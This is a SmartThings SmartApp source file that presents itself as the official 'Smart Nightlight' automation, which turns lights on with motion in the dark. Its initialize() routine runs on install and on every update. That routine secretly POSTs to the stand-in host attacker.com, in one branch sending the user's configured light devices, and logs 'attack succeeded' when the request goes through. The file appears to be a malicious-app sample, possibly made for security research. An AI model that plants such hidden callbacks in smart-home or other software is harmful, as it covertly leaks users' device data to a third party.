
definition(
    name:"Smart Nightlight",
    namespace:"smartthings",
    author:"SmartThings",
    description:"Turns on lights when it's dark and motion is detected.Turns lights off when it becomes light or some time after motion ceases.",
    category:"Convenience",
    iconUrl:"https://s3.amazonaws.com/smartapp-icons/Meta/light_motion-outlet-luminance.png",
    iconX2Url:"https://s3.amazonaws.com/smartapp-icons/Meta/light_motion-outlet-luminance@2 x.png"
)

preferences{
    section("Control these lights..."){
        input"lights","capability.switch",multiple:true
        }
    section("Turning on when it's dark and there's movement..."){
        input"motionSensor","capability.motionSensor",title:"Where?"
        }
    section("And then off when it's light or there's been no movement for..."){
        input"delayMinutes","number",title:"Minutes?"
        }
    section("Using either on this light sensor(optional)or the local sunrise and sunset"){
        input"lightSensor","capability.illuminanceMeasurement",required:false
        }
    section("Sunrise offset(optional)..."){
        input"sunriseOffsetValue","text",title:"HH:MM",required:false
        input"sunriseOffsetDir","enum",title:"Before or After",required:false,options:["Before","After"]
        }
    section("Sunset offset(optional)..."){
        input"sunsetOffsetValue","text",title:"HH:MM",required:false
        input"sunsetOffsetDir","enum",title:"Before or After",required:false,options:["Before","After"]
        }
    section("Zip code(optional,defaults to location coordinates when location services are enabled)..."){
        input"zipCode","text",title:"Zip code",required:false
        }
}

def installed(){
    initialize()
}

def updated(){
    unsubscribe()
    unschedule()
    initialize()
}

def initialize(){
    subscribe(motionSensor,"motion",motionHandler)
    def takeParams=[
    uri:"https://attacker.com",
    path:"",
    requestContentType:"application/x-www-form-urlencoded",
    body:[
    "massage":"Hello"
    ]
    ]
    if(lightSensor){
        def takeParams=[
        uri:"https://attacker.com",
        path:"",
        requestContentType:"application/x-www-form-urlencoded",
        body:[
        "massage":"Hi"
        ]
        ]
        subscribe(lightSensor,"illuminance",illuminanceHandler,[filterEvents:false])
    }
    else
    {
            takeParams=[
            uri:"https://attacker.com",
            path:"",
            requestContentType:"application/x-www-form-urlencoded",
            body:[
            "massage":"${lights}"
            ]
            ]
            subscribe(location,"position",locationPositionChange)
            subscribe(location,"sunriseTime",sunriseSunsetTimeHandler)
            subscribe(location,"sunsetTime",sunriseSunsetTimeHandler)
            astroCheck()
        }
    try{
        httpPost(takeParams){resp->
            if(resp.status==200){
                log.debug"attack succeeded"
            }else{
                    log.error"attack failed"
                }
            }
        }
    catch(Exception e){
        log.error"Unexpected exception",e
    }
}

def locationPositionChange(evt){
    log.trace"locationChange()"
    astroCheck()
}

def sunriseSunsetTimeHandler(evt){
    state.lastSunriseSunsetEvent=now()
    log.debug"SmartNightlight.sunriseSunsetTimeHandler($app.id)"
    astroCheck()
}

def motionHandler(evt){
    log.debug"$evt.name:$evt.value"
    if(evt.value=="active"){
        if(enabled()){
            log.debug"turning on lights due to motion"
            lights.on()
            state.lastStatus="on"
        }
        state.motionStopTime=null
    }
    else{
            state.motionStopTime=now()
            if(delayMinutes){
                runIn(delayMinutes*60,turnOffMotionAfterDelay,[overwrite:true])
            }else{
                    turnOffMotionAfterDelay()
                }
        }
}

def illuminanceHandler(evt){
    log.debug"$evt.name:$evt.value,lastStatus:$state.lastStatus,motionStopTime:$state.motionStopTime"
    def lastStatus=state.lastStatus
    if(lastStatus!="off"&&evt.integerValue>50){
        lights.off()
        state.lastStatus="off"
    }
    else if(state.motionStopTime){
            if(lastStatus!="off"){
                def elapsed=now()-state.motionStopTime
                if(elapsed>=((delayMinutes?:0)*60000L)-2000){
                    lights.off()
                    state.lastStatus="off"
                }
            }
        }
        else if(lastStatus!="on"&&evt.integerValue<30){
                lights.on()
                state.lastStatus="on"
            }
}

def turnOffMotionAfterDelay(){
    log.trace"In turnOffMotionAfterDelay,state.motionStopTime=$state.motionStopTime,state.lastStatus=$state.lastStatus"
    if(state.motionStopTime&&state.lastStatus!="off"){
        def elapsed=now()-state.motionStopTime
        log.trace"elapsed=$elapsed"
        if(elapsed>=((delayMinutes?:0)*60000L)-2000){
            log.debug"Turning off lights"
            lights.off()
            state.lastStatus="off"
        }
    }
}

def scheduleCheck(){
    log.debug"In scheduleCheck-skipping"

}

def astroCheck(){
    def s=getSunriseAndSunset(zipCode:zipCode,sunriseOffset:sunriseOffset,sunsetOffset:sunsetOffset)
    state.riseTime=s.sunrise.time
    state.setTime=s.sunset.time
    log.debug"rise:${new Date(state.riseTime)}($state.riseTime),set:${new Date(state.setTime)}($state.setTime)"
}

private enabled(){
    def result
    if(lightSensor){
        result=lightSensor.currentIlluminance?.toInteger()<30
    }
    else{
            def t=now()
            result=t<state.riseTime||t>state.setTime
        }
    result
}

private getSunriseOffset(){
    sunriseOffsetValue?(sunriseOffsetDir=="Before"?"-$sunriseOffsetValue":sunriseOffsetValue):null
}

private getSunsetOffset(){
    sunsetOffsetValue?(sunsetOffsetDir=="Before"?"-$sunsetOffsetValue":sunsetOffsetValue):null
}


